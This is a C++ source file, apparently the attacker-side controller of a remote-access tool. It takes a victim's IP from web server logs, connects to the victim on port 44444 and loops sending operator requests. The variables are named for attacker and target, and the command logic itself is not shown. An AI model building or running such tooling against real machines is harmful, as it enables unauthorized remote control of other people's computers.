
#include "communication.h"


int main() {
    SOCKET TargetSocket = 0;
    int ConnectionResult = 0;
    char AttackerIP[MAX_IPV4_SIZE] = { 0 };
    char TargetIP[MAX_IPV4_SIZE] = { 0 };
    USHORT TargetPort = 44444;
    USHORT AttackerPort = 44444;
    NETWORK_INFO ConnConfigArray[2] = { 0 };
    WSADATA WSAData = { 0 };


    // Get IP address of target and match it to one of the attacker's IP addresses:
    printf("[!] Write IP address of target (see in the web server requests logs) -> ");
    scanf_s("%s", TargetIP);
    if (!IpAddresses::IsValidIp(TargetIP)) {
        printf("\n[-] Wrong format of IPV4 address, format should consist of:\n"
               "1. 4 one digit - triple digit numerical values in the range of 1-255\n"
               "2. There should be a . between each chunk and the previous chunk\n"
               "3. address should NOT consist any other non-numerical characters except the 3 . between each 2 chunks\n"
               "Example address: 192.1.178.49\n");
        return 0;
    }
    if (!IpAddresses::MatchIpAddresses(AttackerIP, TargetIP)) {
        printf("\n[-] Could not get the address of the attacker machine relatively to the target machine!\n");
        return 0;
    }
    printf("\nTarget address: %s, attacker address: %s\n", TargetIP, AttackerIP);
    SetNetStructs(TargetIP, AttackerIP, TargetPort, AttackerPort, ConnConfigArray);


    // Initialize Winsock (required for using sockets and socket functions):
    if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
        printf("Winsock initialization process failed - %d\n", WSAGetLastError());
        return 1;
    }


    // Create client socket:
    TargetSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (TargetSocket == INVALID_SOCKET) {
        printf("Could not create socket object - %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    ConnConfigArray[0].AsoSock = TargetSocket;



    // Connect to target socket:
    if (connect(ConnConfigArray[0].AsoSock, (sockaddr*)&ConnConfigArray[1].AddrInfo, sizeof(sockaddr)) == SOCKET_ERROR) {
        printf("Error connecting to target - %d\n", WSAGetLastError());
        closesocket(ConnConfigArray[0].AsoSock);
        WSACleanup();
        return 1;
    }


    // Start main operations:
    printf("Initialization of connection succeeded, proceeding to start sending requests..\n");
    while (TRUE) {
        ConnectionResult = ClientOperation(ConnConfigArray[0], ConnConfigArray[1]);
        CleanNetStack(ConnConfigArray[0].AsoSock);
        if (ConnectionResult == -1) {
            closesocket(ConnConfigArray[0].AsoSock);
            WSACleanup();
            return 1;
        }
    }
    WSACleanup();
    return 0;
}